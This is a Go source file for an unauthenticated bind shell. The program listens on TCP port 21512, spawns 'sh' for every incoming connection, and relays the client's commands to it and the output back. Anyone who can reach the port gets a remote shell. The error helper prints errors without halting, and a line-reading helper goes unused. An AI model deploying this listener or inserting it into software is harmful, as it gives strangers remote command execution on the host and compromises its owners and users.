package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
)

func main() {

	listener, err := net.Listen("tcp", ":21512")
	rr("Error setting up TCP listener: ", err)
	defer listener.Close()
	for { // Connection loop //
		conn, err := listener.Accept()
		rr("Error accepting connection: ", err)
		fmt.Println("Connection accepted!")

		cmd := exec.Command("sh")
		stdin, _ := cmd.StdinPipe()
		cmd.Stdout = conn
		cmd.Stderr = conn

		if err := cmd.Start(); err != nil {
			fmt.Fprintln(conn, "error starting shell:", err)
			return
		}
		defer cmd.Process.Kill()

		scanner := bufio.NewScanner(conn)

		for scanner.Scan() { //Command loop //
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if line == "exit" {
				conn.Close()
				break
			}
			fmt.Fprintf(stdin, "%s\necho ---END---\n", line) //Writes the command to stdin, then echos the end-of-transmission marker immediately as the next command.
		}
		fmt.Println("Connection closed!")

	}

}

func GetLinesChannel(f io.ReadCloser) <-chan string {
	ch := make(chan string)
	slice := make([]byte, 8)
	var str string
	var sections []string

	go func() {
		for {
			n, err := f.Read(slice)
			if err == io.EOF {
				ch <- str
				close(ch)
				f.Close()
				return
			}
			rr("Error reading from reader: ", err)

			str += string(slice[:n])
			sections = strings.Split(str, "\n")
			if len(sections) == 2 {
				ch <- sections[0]

				str = sections[1]
			}

		}
	}()
	return ch
}

func rr(message string, err error) {
	if err != nil {
		fmt.Print("Error: ", err, "\n")
	}
}
